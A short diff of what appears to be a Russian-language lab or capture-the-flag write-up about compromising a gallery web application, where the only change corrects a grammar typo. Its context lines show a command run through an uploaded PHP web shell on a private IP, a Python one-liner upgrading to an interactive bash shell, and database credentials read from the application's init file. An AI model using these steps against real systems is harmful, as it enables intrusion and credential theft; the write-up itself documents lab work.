@@ -94,7 +94,7 @@ http://10.113.158.186/gallery/uploads/1794906900_shell.php?command=python3%20-c%
 ```sh
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
-В файле инициализации веб-приложение были обнаружены доступы к БД:
+В файле инициализации веб-приложения были обнаружены доступы к БД:
 ```sh
 if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
 if(!defined('DB_USERNAME')) define('DB_USERNAME',"gallery_user");
